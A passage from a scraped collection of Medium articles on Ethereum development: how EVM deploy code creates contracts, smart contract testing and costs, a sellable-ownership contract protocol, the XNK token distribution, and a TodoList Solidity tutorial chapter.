Auxdataa165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029Deploy code runs when the contract is being created.Contract code runs after the contract had been created, when its methods are called.(optional) Auxdata is the cryptographic fingerprint of the source code, used for verification. This is just data, and never executed by the EVM.The deploy code has two main purposes:Runs the constructor function, and sets up initial storage variables (like contract owner).Calculates the contract code, and returns it to the EVM.The deploy code generated by the Solidity Compiler loads the bytes 60606040525b600080fd00 from bytecode into memory, then returns it as the contract code. In this case, the \"calculation\" is merely reading a chunk of data into memory. In principle, we could programatically generate the contract code.Exactly what the constructor does is up to the language, but any EVM language would have to return the contract code at the end.Contract CreationSo what happens after the deploy code had run and returned the contract code. How does Ethereum create a contract from the returned contract code?Let\u2019s dig into the source code together to learn the details.I\u2019ve found that the Go-Ethereum implementation is the easiest reference to find the information I need. We get proper variable names, static type info, and symbol cross-references. Try beating that, Yellow Paper!The relevant method is evm.Create, read it on Sourcegraph (there\u2019s type info when you hover over a variable, pretty sweet). Let\u2019s skim the code, omitting some error checking and fussy details. From top to bottom:Check whether caller has enough balance to make a transfer:if !evm.CanTransfer(evm.StateDB, caller.Address(), value) { return nil, common.Address{}, gas, ErrInsufficientBalance}Derive the new contract\u2019s address from the caller\u2019s address (passing in the creator account\u2019s nonce):contractAddr = crypto.CreateAddress(caller.Address(), nonce)Create the new contract account using the derived contract address (changing the \u201cworld state\u201d StateDB):evm.StateDB.CreateAccount(contractAddr)Transfer the initial Ether endowment from caller to the new contract:evm.Transfer(evm.StateDB, caller.Address(), contractAddr, value)Set input data as contract\u2019s deploy code, then execute it with EVM. The ret variable is the returned contract code:contract := NewContract(caller, AccountRef(contractAddr), value, gas)contract.SetCallCode(&contractAddr, crypto.Keccak256Hash(code), code)ret, err = run(evm, snapshot, contract, nil)Check for error. Or if the contract code is too big, fail. Charge the user gas then set the contract code:if err == nil && !maxCodeSizeExceeded {  createDataGas := uint64(len(ret)) * params.CreateDataGas  if contract.UseGas(createDataGas) {    evm.StateDB.SetCode(contractAddr, ret)  } else {    err = ErrCodeStoreOutOfGas  }}Code That Deploys\u00a0CodeLet\u2019s now dive into the nitty gritty assembly code to see how \u201cdeploy code\u201d returns \u201ccontract code\u201d when a contract is created. Again, we\u2019ll analyze the example contract:pragma solidity ^0.4.11;contract C {}The bytecode for this contract broken into separate chunks:// Deploy code60606040523415600e57600080fd5b5b603680601c6000396000f300// Contract code60606040525b600080fd00// Auxdataa165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029The assembly for the deploy code is:// Reserve 0x60 bytes of memory for Solidity internal uses.mstore(0x40, 0x60)// Non-payable contract. Revert if caller sent ether.jumpi(tag_1, iszero(callvalue))0x0dup1revert// Copy contract code into memory, and return.tag_1:tag_2:  dataSize(sub_0)  dup1  dataOffset(sub_0)  0x0  codecopy  0x0  returnstopTracing through the above assembly for returning the contract code:// 60 36 (PUSH 0x36)dataSize(sub_0)  stack: [0x36]dup1  stack: [0x36 0x36]// 60 1c == (PUSH 0x1c)dataOffset(sub_0)  stack: [0x1c 0x36 0x36]0x0  stack: [0x0 0x1c 0x36 0x36]codecopy  // Consumes 3 arguments  // Copy `length` of data from `codeOffset` to `memoryOffset`  // memoryOffset = 0x0  // codeOffset   = 0x1c  // length       = 0x36  stack: [0x36]0x0  stack: [0x0 0x36]  memory: [    0x0:0x36 => calldata[0x1c:0x36]  ]return  // Consumes 2 arguments  // Return `length` of data from `memoryOffset`  // memoryOffset  = 0x0  // length        = 0x36  stack: []  memory: [    0x0:0x36 => calldata[0x1c:0x36]  ]dataSize(sub_0) and dataOffset(sub_0) are not real instructions. They are in fact PUSH instructions that put constants onto the stack. The two constants 0x1C (28) and 0x36 (54) specifies a bytecode substring to return as contract code.The deploy code assembly roughly corresponds to the following Python3 code:memory = []calldata = bytes.fromhex(\"60606040523415600e57600080fd5b5b603680601c6000396000f30060606040525b600080fd00a165627a7a72305820b5090d937cf89f134d30e54dba87af4247461dd3390acf19d4010d61bfdd983a0029\")size = 0x36   // dataSize(sub_0)offset = 0x1c // dataOffset(sub_0)// Copy substring of calldata to memorymemory[0:size] = calldata[offset:offset+size]// Instead of return, print the memory content in hexprint(bytes(memory[0:size]).hex())The resulting memory content is:60606040525b600080fd00a165627a7a72305820b5090d937cf89f134d30e54dba87af4247461dd3390acf19d4010d61bfdd983a0029Which corresponds to the assembly (plus auxdata):// 6060604052600080fd00mstore(0x40, 0x60)tag_1:  0x0  dup1  revertauxdata: 0xa165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029Looking again on Etherscan, this is exactly what was deployed as the contract code:Ethereum Account 0x2c7f561f1fc5c414c48d01e480fdaae2840b8aa2 InfoThe Ethereum BlockChain Explorer, API and Analytics Platformrinkeby.etherscan.ioCODECOPYThe deploy code uses codecopy to copy from transaction\u2019s input data to memory.The exact behaviour and arguments for the codecopy instruction is less obvious than other simpler instructions. If I were to look it up in the Yellow Paper, I\u2019d probably get more confused. Instead, let\u2019s refer to the go-ethereum source code to see what it\u2019s doing.See CODECOPY:func opCodeCopy(pc *uint64, evm *EVM, contract *Contract, memory *Memory, stack *Stack) ([]byte, error) { var (  memOffset  = stack.pop()  codeOffset = stack.pop()  length     = stack.pop() ) codeCopy := getDataBig(contract.Code, codeOffset, length) memory.Set(memOffset.Uint64(), length.Uint64(), codeCopy)evm.interpreter.intPool.put(memOffset, codeOffset, length) return nil, nil}No Greek letters!The line evm.interpreter.intPool.put(memOffset, codeOffset, length) recyles objects (big integers) for later uses. It is just an efficiency optimization.Constructor ArgumentAside from returning the contract code, the other purpose of the deploy code is to run the constructor to set things up. If there are constructor arguments, the deploy code needs to somehow load the arguments data from somewhere.The Solidity convention for passing constructor arguments is by appending the ABI encoded parameter values at the end of the bytecode when calling eth_sendtransaction. The RPC call would pass in the bytecode and ABI encoded params together as input data, like this:{  \"from\": \"0xbd04d16f09506e80d1fd1fd8d0c79afa49bd9976\"  \"data\": hexencode(compiledByteCode + encodedParams),}Let\u2019s look at an example contract with one constructor argument:pragma solidity ^0.4.11;contract C {  uint256 a;  function C(uint256 _a) {    a = _a;  }}I\u2019ve created this contract, passing in the value 66. The transaction on Etherscan:https://rinkeby.etherscan.io/tx/0x2f409d2e186883bd3319a8291a345ddbc1c0090f0d2e182a32c9e54b5e3fdbd8The input data is:0x60606040523415600e57600080fd5b6040516020806073833981016040528080519060200190919050508060008190555050603580603e6000396000f3006060604052600080fd00a165627a7a7230582062a4d50871818ee0922255f5848ba4c7e4edc9b13c555984b91e7447d3bb0e7400290000000000000000000000000000000000000000000000000000000000000042We can see the constructor argument at the very end, which is the number 66, but ABI encoded as a 32 bytes number:0000000000000000000000000000000000000000000000000000000000000042To process the arguments in the constructor, the deploy code copies the ABI parameters from the end of the calldata into memory, then from memory onto the stack.A Contract That Creates ContractsThe FooFactory contract can create new instances of Foo by calling makeNewFoo:pragma solidity ^0.4.11;contract Foo {}contract FooFactory {  address fooInstance;  function makeNewFoo() {    fooInstance = new Foo();  }}The full assembly for this contract is In This Gist. The structure of the compiler output is more complicated, because there are two sets of \u201cinstall time\u201d and \u201crun time\u201d bytecode. It\u2019s organized like this:FooFactoryDeployCodeFooFactoryContractCode  FooDeployCode  FooContractCode  FooAUXDataFooFactoryAUXDataThe FooFactoryContractCode essentially copies the bytecode for Foo in tag_8 then jump back to tag_7 to execute the create instruction.The create instruction is like the eth_sendtransaction RPC call. It provides a way to create new contracts from within the EVM.See opCreate for the go-ethereum source code. This instruction calls evm.Create to create a contract:res, addr, returnGas, suberr := evm.Create(contract, input, gas, value)We\u2019ve seen evm.Create earlier, but this time the caller is an Smart Contract, not a human.AUXDATAIf you absolutely must know all about what auxdata is, read Contract Metadata. The gist of it is that auxdata is a hash that you can use to fetch metadata about the deployed contract.The format of auxdata is:0xa1 0x65 'b' 'z' 'z' 'r' '0' 0x58 0x20 <32 bytes swarm hash> 0x00 0x29`Deconstructing the auxdata bytesequence we\u2019ve seen previously:a1 65// b z z r 0 (ASCII)62 7a 7a 72 3058 20// 32 bytes hash62a4d50871818ee0922255f5848ba4c7e4edc9b13c555984b91e7447d3bb0e7400 29There you go, one more Ethereum trivia for the party night.ConclusionThe way contracts are created is similar to how a self-extracting software installer works. When the installer runs, it configures the system environment, then extracts the target program onto the system by reading from its program bundle.There is enforced separation between \u201cinstall time\u201d and \u201crun time\u201d. No way to run the constructor twice.Smart contracts can use the same process to create other smart contracts.It is easy for a non-Solidity languages to implement.At first, I found it confusing that different parts of the \u201csmart contract installer\u201d is packed together in the transaction as a data byte string:{  \"data\": constructorCode + contractCode + auxdata + constructorData}How data should be encoded is not obvious from reading the documentation for eth_sendtransaction. I couldn't figure out how constructor arguments are passed into a transaction until a friend told me that they are ABI-encoded then appended to the end of the bytecode.An alternative design that would\u2019ve made it clearer is perhaps to send these parts as separate properties in a transaction:{  // For \"install time\" bytecode  \"constructorCode\": ...,  // For \"run time\" bytecode  \"constructorBody\": ...,  // For encoding arguments  \"data\": ...,}On more thoughts, though, I think that it\u2019s actually very powerful that the Transaction object is so simple. To a Transaction, data is just a byte string, and it doesn't dictate a language model for how the data should be interpreted. By keeping the Transaction object simple, language implementers have a blank canvas for design and experiments.Indeed, data could even be interpreted by a different virtual machine in the future.If you like furry animals, you should follow me on Twitter @hayeah.", "responses": "2"}, {"title": "The Ultimate Guide to Test Your Smart\u00a0Contract", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/ethereum-developers/the-ultimate-guide-to-test-your-smart-contract-ddc65fbb5ba5?source=search_post", "post_date": "May 9, 2018", "readtime": "10 min read", "upvotes": "600", "content": "The Ultimate Guide to Test Your Smart\u00a0ContractMerunas GrincalaitisBlockedUnblockFollowFollowingMay 9, 2018Testing is one of the most important\u200a\u2014\u200ayet overlooked\u200a\u2014\u200aaspect of the development of smart contract. Whenever you create a smart contract you have to make sure that it\u2019s working properly and testing is the best way for using the contract in different situations without any risk. In this guide, you\u2019ll learn the steps that you need to take to make sure your contracts are safe via testing.Here\u2019s all that you\u2019ll know after finishing this tutorial:How to set up a testing environment with truffleHow to write the tests in javascript and execute them in a test networkThe 5 things that you must test in any contractConclusionNote that you should have at least a medium level of javascript to write tests however you should be able to understand most of what\u2019s going on.", "responses": "6"}, {"title": "Problems & Costs of Smart Contract Development", "author_name": "Michiel Mulders", "link": "https://hackernoon.com/problems-costs-of-smart-contract-development-e86e9446ba9e?source=search_post", "post_date": "Mar 25, 2018", "readtime": "3 min read", "upvotes": "683", "content": "Problems & Costs of Smart Contract DevelopmentCan your business afford\u00a0it?Michiel MuldersBlockedUnblockFollowFollowingMar 25, 2018Image by Gratisography.comThe problem with smart contracts is that most small and medium businesses are unable to implement smart contracts not only due to technological complexity but mostly because of their expensiveness. The costs for smart contract development are skyrocketing as there is an increasing demand for smart contract developers and contracts for ICOs.Why smart contracts are so great in the first\u00a0place?Smart contracts, which are, actually, a self-executing code on blockchain that automatically implements the terms of an agreement between parties or business logic. It\u2019s basically an unbreakable agreement with predefined rules. In addition, smart contracts are deterministic which means the same output will be generated from a given initial state/input. Because of these properties, companies are keen to experiment with smart contracts to find opportunities for their business model. Being a first-mover gives a company many advantages like new clients, media attention, and more revenue.What\u2019s the actual cost of smart contract development?The development process itself is not only driving the costs. Proper auditing and testing are very expensive as this requires even more specialized niche knowledge to find bugs/faults in your smart contract code.A simple smart contract with no complex business logic costs around $7,000. More advanced contracts cost up to $45,000 and more. It\u2019s not uncommon large organizations with specialized knowledge ask up to $100,000. In addition, don\u2019t forget about the costs for deploying your contract on the main net. The complexity of your contract defines the price.It\u2019s even possible to calculate the exact gas price of your smart contract. If you do a quick google search for \u2018Gas Costs from Yellow Paper\u2019 you will find this spreadsheet. Each operation is listed in the spreadsheet with the gas price for executing it. For example, using the \u2018addition\u2019 operation costs you 3 gas (which is very low). If you have a more complex contract, it\u2019s not easy to calculate this. The Mist wallet, for example, is capable of making a rough estimation of the actual gas cost when deploying your contract.Spreadsheet Gas Costs\u00a0EthereumSolving the price\u00a0problemThe problem with smart contracts is that most small and medium businesses are unable to implement smart contracts not only due to technological complexity but mostly because of their expensiveness.iOlite is solving this problem using their Fast Adaptation Engine (FAE). Contributors, smart contract experts, can define structures linked to smart contract code. Through machine training, the FAE is capable of understanding more complex language, resulting in the creation of better smart contracts. Best of all, the FAE doesn\u2019t charge you any money for the development of a smart contract. On the other side, contributors are rewarded with iLT tokens through the mining process. The mining process occurs when a solution has been found for a specific input.If you want to know more about iOlite, check out their Medium or join them on Telegram.", "responses": "4"}, {"title": "A Protocol for Sellable Smart Contracts", "author_name": "Pablo Ruiz", "link": "https://medium.freecodecamp.org/a-protocol-for-sellable-smart-contracts-829bc2ce02b3?source=search_post", "post_date": "Dec 23, 2017", "readtime": "6 min read", "upvotes": "460", "content": "Photo by Jezael Melgoza on\u00a0UnsplashA Protocol for Sellable Smart ContractsPablo RuizBlockedUnblockFollowFollowingDec 23, 2017Ethereum doesn\u2019t have the concept of smart contract ownership built into it.Even though the creation and deployment of a smart contract is done by an account\u200a\u2014\u200abe it an External Owned Account (EOA) or another contract\u200a\u2014\u200abeing the creator of the smart contract doesn\u2019t give the account any special privileges over the contract they deployed.Most use cases for smart contracts require someone to own the contracts. This \u201cowner\u201d is given privileges\u200a\u2014\u200aand responsibilities\u200a\u2014\u200aover the smart contract.In a crowdsale contract they might be tasked with managing the whole process and pausing the crowdsale if something goes wrong.In a Lottery/Ruffle Dapp they might be tasked with executing the number draw.In any contract that holds funds, they might be set as the beneficiary upon construct destruction.Photo by Ricardo Resende on\u00a0UnsplashA common pattern used by many smart contracts is to set the owner to the account deploying the contract like so:pragma solidity 0.4.19;contract MyContract {  address owner;  function MyContract(){    owner = msg.sender;  }}Then, adding a modifier:modifier onlyOwner {  require(msg.sender == owner);  _;    }And finally, using that modifier to enforce that critical operations can only be performed by the owner of the contract:// Suicide the contract and transfer funds to the owner// Only available to the owner, for obvious reasons.function destroyContract() public onlyOwner {  selfdestruct(owner);}The Problem with Changing Contract OwnershipThere are some situations that would require ownership of a contract to be given to someone else. To name a few:The person that deployed the contract did it on behalf of someone elseA developer or consultant doing a contracting job for a companyA company wants to liquidate / sell its assets, which include smart contractsWhich might or not have ether balanceThe owner of the smart contract wants to give it away, donate it, or just flip it for profitPhoto by rawpixel.com on\u00a0UnsplashSome contracts, but unfortunately not many, include a function to give ownership of the contract to some other account. And some of them also include another function for that person to accept the ownership that has been bestowed upon him.function changeOwner(address _newOwner)public onlyOwner {  ownerCandidate = _newOwner;}function acceptOwnership()public {  require(msg.sender == ownerCandidate);    owner = ownerCandidate;}Now, the situations mentioned above share a few common issues that these not-so-widely-used changeOwner() and acceptOwnership() functions don\u2019t address:How can the buyer of the contract be certain that once they pay for the ownership of the contract, the seller will actually execute the corresponding changeOwner() function?This can happen the other way around. How can the seller of the contract be certain that they will get paid if they cede ownership first?How can the buyer of the contract be certain that the current owner of the contract will not modify it (well, it\u2019s data) before giving away its ownership?The Sellable Contract\u00a0ProtocolThe solution I propose is implementing a series of functions that would allow the owner of a smart contract to sell it in exchange of ether to someone of his choosing or just put it up for sale for anyone to buy at the asking price on a first-come first-save basis. This could be extended to allow different sale methods using different auction styles.The details of the protocol can be read\u200a\u2014\u200aand discussed\u200a\u2014\u200aon the corresponding EIP.In the following paragraphs I\u2019ll go through an implementation example, which is available on my Github Repository.Handling OwnershipHandling ownership of the contract is pretty basic. As typically done, we set the owner of the deployed contract to msg.sender upon initialization:function Sellable() public {        owner = msg.sender;        Transfer(now,address(0),owner,0);    }Then, we add the onlyOwner modifier, which will be used on every function that we want to make only executable by the person currently owning the contract:modifier onlyOwner {        require(msg.sender == owner);        _;    }What we\u2019ll want our contract to do is to allow the owner to be changed under certain conditions.Putting the Contract for\u00a0SaleThe owner of the contract can put it up for sale by calling the following function:function initiateSale(uint _price, address _to) onlyOwner public {        require(_to != address(this) && _to != owner);        require(!selling);                selling = true;                // Set the target buyer, if specified.        sellingTo = _to;                askingPrice = _price;    }initiateSale() takes two parameters:uint _price: which is the price the owner wants to sell the contract for.address _to: which is optional, and corresponds to who the owner wants to sell the contract to.When putting the contract up for sale, the owner has two options: They can choose the buyer, in that case the sale has been prearrange. Or they can simply \u201cannounce\u201d the contract is for sale and the first person to claim it (and paying its price) gets it.Additionally, the asking price can be set to 0. This means that the owner of the contract is allowed to gift, donate or give the contract away.There\u2019s one more important thing to notice: There\u2019s a ifNotLocked modifier that can be added to the contract\u2019s functions to prevent them from being executed if the contract is in a sale process. If used properly, this prevents the contract\u2019s data from being modified just before it is purchased.Finally, there\u2019s the cancelPurchase() function which allows the owner to cancel the sale before someone completes it.function cancelSale() onlyOwner public {        require(selling);                // Reset sale variables        resetSale();    }Buying the\u00a0ContractOnce the contract is up for sale, all it takes to complete the sale is for the buyer (if it was specified) or anyone (if no particular buyer was specified) to call the following function:function completeSale() public payable {        require(selling);        require(msg.sender != owner);        require(msg.sender == sellingTo || sellingTo == address(0));        require(msg.value == askingPrice);                // Swap ownership        address prevOwner = owner;        address newOwner = msg.sender;        uint salePrice = askingPrice;                owner = newOwner;                // Transaction cleanup        resetSale();                prevOwner.transfer(salePrice);                Transfer(now,prevOwner,newOwner,salePrice);    }The completeSale() function is a payable function which requires the ether to be sent. The amount to be sent must be the exactly the same the owner set as the asking price.When completeSale() is executed, the ether will be transferred to the owner and then the ownership will be transferred to the buyer. This finishes the transaction and cleans up the contract for the new owner, who can now use it normally, or even put it up for sale again.An Example Use\u00a0CaseHere\u2019s a very simple example of how this base contract could be used:contract Kitty is Sellable {        string public name;    uint public kittyValue = 0;        function Kitty(string _name) public {        name = _name;    }        function findNewOwner() public onlyOwner {        kittyValue = kittyValue + 1 ether;           super.initiateSale(kittyValue,address(0));    }        function renameKitty(string newName) ifNotLocked public onlyOwner {        name = newName;    }        function buyKitty() public payable {        require(msg.value == kittyValue);        super.completeSale();    }}We have a contract which represents a CryptoKitty \ud83d\ude3a. The owner can findNewOwner() to put it up for sale. Each time the kitty is bought his value increases by 1 ether. The owner of the kitty can change its name, as long as it is not being sold at the moment by implementing the ifNotLocked modifier in renameKitty\u00a0.That\u2019s it!If you have further suggestions to improve this Sellable protocol, please add your comments, bugs or suggestions in the EIP I created.Photo by Jonas Vincent on\u00a0Unsplash", "responses": "1"}, {"title": "XNK Token Distribution and Ink Protocol Smart\u00a0Contract", "author_name": "Ink Protocol", "link": "https://medium.com/@PayWithInk/xnk-token-distribution-and-ink-protocol-smart-contract-f8ba3da1e985?source=search_post", "post_date": "Feb 27, 2018", "readtime": "3 min read", "upvotes": "735", "content": "XNK Token Distribution and Ink Protocol Smart\u00a0ContractInk ProtocolBlockedUnblockFollowFollowingFeb 27, 2018Update 2/27/18: added the original presale contract address below too.Hi everyone, the token distribution is almost here! We\u2019ve been working hard to prepare, and this post will serve as an overview of what will happen during our distribution. The distribution day is also the same day we launch on Listia, so there\u2019s a lot going on. As promised, you can start using your new XNK on Listia or any peer-to-peer transaction from the very first day!Our primary focus right now is to enure a smooth distribution and also a seamless transition on Listia. But don\u2019t worry, we will have more fun and exciting partnership, developer, and community announcements, videos, and events coming soon after the dust settles, so stay tuned!Official Ink Protocol Smart Contract and XNK Token Address:0xBC86727E770de68B1060C91f6BB6945c73e10388XNK, 18 decimalsYou can start adding this to your MEW, Metamask, or other wallets now! We have updated our official information on Etherscan, and it should be updated on their site soon as well. You can also explore the code, and you may see a few transfers already. Don\u2019t worry, we are testing internally and on Listia to ensure a smooth kickoff! Distribution will all happen on the 28th.The token distribution will start on 2/28/18 at around 2PM UTC.If you participated in any of the private sales, your tokens will be distributed both manually and via an automated system we have. As such, the exact time you receive your tokens will vary.If you participated in the presale, you can retrieve your tokens from the presale smart contract starting around 2PM UTC. We will trigger a call to unlock the smart contract at that time, but the actual unlock time may vary by a couple minutes due to Ethereum transaction times.The original presale smart contract address was:0x9bbb9387C9E2477A6b5D81AfeCe00255875c48CeOnly sent 0 ETH transactions please!To retrieve your presale tokens, please follow the instructions from the Guide to the Presale Smart Contract. Basically, you just send a 0 ETH transaction from the address you used during the sale. You can do this at your convenience, and there is no rush or time limit in which you need to do this.After a few days to a week, we will automatically send out any tokens that haven\u2019t already been retrieved.Airdrops for the Quantstamp Community will start on 2/28We will be giving the first batch of tokens directly to Quantstamp for distribution to anyone who is eligible under their PoC program. We are super excited to be part of the QSP community and they will be publishing the full results of the Ink Protocol security audit very soon!Much love to the QSP community\u00a0:) We hope you will enjoy using your XNK tokens on Listia and other marketplaces!Listia will start converting to XNK on 2/28All existing Listia users will be able to convert their credits to XNK.New listings will be denominated in XNK.You can transfer your XNK into Listia and start buying stuff!You can start selling items on Listia and earning XNK too!Airdrops for CFD holders in our snapshot and form will start on 2/28Lastly, our previously announced airdrop for CFD holders will also happen on 2/28! You can read more about that here. The amount of tokens is related to the amount of CFD you had either in the snapshot or in the form that was submitted and is loosely based on ownership percentage, with some weighting to make sure everyone gets something. XNK will be sent directly to the address in our snapshot or the one you filled into the form.", "responses": "1"}, {"title": "Smart Contract project: To Do Notes and My New\u00a0Book", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/@merunasgrincalaitis/smart-contract-project-to-do-notes-and-my-new-book-8d569d4186a7?source=search_post", "post_date": "Apr 5, 2018", "readtime": "14 min read", "upvotes": "336", "content": "Smart Contract project: To Do Notes and My New\u00a0BookMerunas GrincalaitisBlockedUnblockFollowFollowingApr 5, 2018This is a fragment of my recently released book called \u201cEthereum Developer: Learn Solidity From Scratch\u201d. It\u2019s a book that I wrote from my experience working in about 5 different startups where I learned different things about creating Smart Contracts, decentralized applications and audits.You can find the book here on amazon free with kindle unlimited: https://www.amazon.com/dp/B07BJB1YNQ it covers everything you need to know from scratch including web3.js, dapps, audits and much more. Be sure to check the index to see if it could help you.In this article I\u2019ll give you for free a chapter of the book to show you what you\u2019ll find in it so that you see if you are interested in the book or not.Chapter 13 of the book, Smart Contract project: To Do\u00a0notesLet\u2019s put your new gained knowledge to practice with a cool project that you\u2019ll love.This is how the application will look like once the Smart Contracts, front end and web3.js integration is\u00a0completeAll projects should start with a clear specification of what we want to achieve because otherwise you\u2019ll waste time adding unnecessary features and making things differently from the initial goal.When you\u2019re working with a client, make sure you\u2019re understanding what they want to create with as much detail as possible. When working with ICOs, read carefully the whitepaper.This project is no different. Here\u2019s the specification that you\u2019ll be following to create this simple Smart Contract project:\u201cWe want to create a decentralized To Do application that allows users to store simple notes of no more than 32 letters. Each note must contain the date it was created, the address of the owner and if it\u2019s already completed or not. Any user will be able to create notes but only the owner of each note will be able to mark them as completed.\u201dLet\u2019s analyze for a second the specification to understand what we must do:The notes are limited to 32 letters. This means that we\u2019ll use bytes32 for the content of the note since it\u2019s the most optimized way to store them.The notes must contain the date they were created. We\u2019ll use the global variable now to get the current time.The notes have to contain the address of the owner that created that note. We\u2019ll use msg.sender to get the address of that user and store it in mapping.A function to mark the notes as completed. This means that we\u2019ll have to create a struct Notes with the information required and we\u2019ll create a function to update the state of each note.Only the owner will be able to modify the notes. We\u2019ll do this with a new type of function called modifier that allows us to make checks before doing any type of calculation. We\u2019ll use it to compare the address of the sender to the address of the owner of the note.Let\u2019s start by creating a folder in the desktop called todo-dapp and then a file called TodoList.sol. This will be the contract with all the logic. In the real world you usually create a Web3.js web app to interact with the contract. We\u2019ll do that later in this book so make sure you get this part working properly.Inside TodoList.sol, create the base Smart Contract layout:pragma solidity 0.4.20;contract TodoList {}Now you may be asking yourself. Where do I start with this application? Well, the main component of this contract is the Note element. Which is just a struct with several variables. Let\u2019s create that:pragma solidity 0.4.20;contract TodoList {   struct Todo {      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }}Timestamp is the date that the note was created. The other fields are based on the specification.We now need a way to store those notes. We could use an array or a mapping. In this case we\u2019ll use both because each person, each address will have several notes and that can be accomplished with an array. We use a mapping because it allows us to get all the notes from a user with just his address without looping.pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;      // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;      // Owner => last todo id   mapping(address => uint256) public lastIds;}Note that you can make comments with a double forward slash // for line comments or with a slash with asterisk /**/ for block comments.Here\u2019s what I just did:I\u2019ve defined a variable called maxAmountOfTodos which is used to limit the amount of to-do notes each user can have. This is required to avoid that the number of notes that a user creates grows endlessly since we have gas limitations.The mapping todos is where the notes will be stored for each user address.The mapping of lastIds is just a way to keep track of the last ID used for each user, required to add new notes since we are using a fixed-size array in the todos mapping.I like to add a comment on top of each mapping to indicate exactly what the variables inside the mapping mean for clarity purposes. It\u2019s very important to document your code with lots of comments. It will help you understand and debug your code faster.Keep in mind that this is not the best possible solution for this specification. It\u2019s just my way of doing things. You could read the specification and store the notes in a single array in an efficient way. Don\u2019t take my word. Try it yourself without copying the code and see what you can do by yourself.At this point we can start creating the functions for this application. We\u2019ll need a way to add notes to the mapping of todos. Here\u2019s how I did it:pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;      // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;   // Owner => last todo id   mapping(address => uint256) public lastIds;      modifier onlyOwner(address _owner) {      require(msg.sender == _owner);      _;   }   // Add a todo to the list   function addTodo(bytes32 _content) public {      Todo memory myNote = Todo(lastIds[msg.sender], _content, msg.sender, false, now);      todos[msg.sender][lastIds[msg.sender]] = myNote;      if(lastIds[msg.sender] >= maxAmountOfTodos) lastIds[msg.sender] = 0;      else lastIds[msg.sender]++;   }}That\u2019s some new stuff over there. Don\u2019t be scared. Here\u2019s what I did:I\u2019ve created a modifier called onlyOwner to limit the access of the next function. Because we only want to allow the owner of each note to be able to modify his own notes. You\u2019ll later see where it\u2019s used.Then I created the function addTodo with the parameter _content which is the content of the note to create. Inside this function, I\u2019m creating a memory note called myNote and then I\u2019m adding that note to the array of notes of that user, in the mapping todos.Finally, I\u2019m updating the lastId of that user from the lastIds mapping to be able to add new notes since you need to know the index of each element inside the fixed-size array of todos.The parameters of the functions in Solidity usually have an underscore _ in front of them. This is to avoid problems with variables using the same name. For instance:bytes32 content;function addTodo(bytes32 content) {}Notice that those 2 content variables use the same name. This won\u2019t work because in Solidity you can\u2019t use already existing names inside the function. So, we always add an underscore in the function parameters to avoid this problem.Take a look at the struct instance myNote. Do you see something unusual? If you said \u201cThe keyword memory is new, I don\u2019t know what\u2019s that, please explain\u201d you are correct. Memory is a special word that you can use before the variable name when you declare the variable.It indicates that you don\u2019t want to store that variable on the blockchain. It keeps the variable in the memory of the user\u2019s computer executing that code and it\u2019s deleted after the function execution. We must do this on the struct instance Todo because without the memory keyword, Solidity tries to declare variables in storage.This means that when you create a new struct instance, Solidity tries to store it in the storage which is permanently writing information on the blockchain. The Ethereum Virtual Machine has three areas where it can store items.The first is \u201cstorage\u201d, where all the contract state variables reside. Every contract has its own storage and it is persistent between function calls and quite expensive to use.The second is \u201cmemory\u201d, this is used to hold temporary values. It is erased between (external) function calls and is cheaper to use.The third one is the stack, which is used to hold small local variables. It is almost free to use, but can only hold a limited amount of values.For almost all types, you cannot specify where they should be stored, because they are copied every time they are used.The types where the so-called storage location is important are structs and arrays. If you e.g. pass such variables in function calls, their data is not copied if it can stay in memory or stay in storage. This means that you can modify their content in the called function and these modifications will still be visible in the caller.In summary: you have to add the keyword \u201cmemory\u201d to temporary structs and arrays inside functions for avoiding problems with the blockchain storage.I highly recommend you to use the Remix IDE for developing Smart Contracts. It\u2019s a web app where you can write contracts and see errors immediately. You can access it on Remix.ethereum.org. Then, search for \u201cRemix Ethereum tutorial\u201d on youtube to understand how it works. Later in this book you\u2019ll see how it\u2019s used to deploy Smart Contracts on the Ropsten and main Ethereum blockchain networks.All the Smart Contract code that I write ends up in that IDE because it helps me spot errors quickly. It also allows you to execute the functions of your Smart Contract in the real Ethereum blockchain. You\u2019ll need Metamask which is an extension for browsers that allow you to connect to the blockchain.Before continuing with this I want you to do these 2 tasks:Learn how to use the Remix code editor by looking at videos on youtube. You can use it for free at http://Remix.ethereum.orgInstall Metamask and learn how to use it by searching videos. You can install it by going to Metamask.io.Those tools are a must to any Ethereum developer.After that we can continue with the project on the Remix IDE. The next step is to mark to-dos as completed. We\u2019ll do that with a function:pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;      // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;   // Owner => last todo id   mapping(address => uint256) public lastIds;   // Add a todo to the list   function addTodo(bytes32 _content) public {      Todo memory myNote = Todo(lastIds[msg.sender], _content, msg.sender, false, now);      todos[msg.sender][lastIds[msg.sender]] = myNote;         if(lastIds[msg.sender] >= maxAmountOfTodos) lastIds[msg.sender] = 0;      else lastIds[msg.sender]++;   }   // Mark a todo as completed   function markTodoAsCompleted(uint256 _todoId) public {      require(_todoId < maxAmountOfTodos);      require(!todos[msg.sender][_todoId].isCompleted);      todos[msg.sender][_todoId].isCompleted = true;   }}Here\u2019s what I just did:I added the function markTodoAsCompleted which will allow us to mark a to-do as completed whenever the user wants. I simply get the specific to-do from the _todoId sent by the user of the application to mark it as completed.You see that I\u2019m using a new global function called require. This is a very important function that allows us to check some conditions before executing that function. In this case I\u2019m saying: \u201cRequire that the to-do id sent is smaller than the maximum number of to-dos\u201d and \u201cRequire that the to-do selected is not completed\u201d.Most of the require statements are used at the top of the function for checking the parameters of the function even though you can use the require function wherever you want. I\u2019m using the 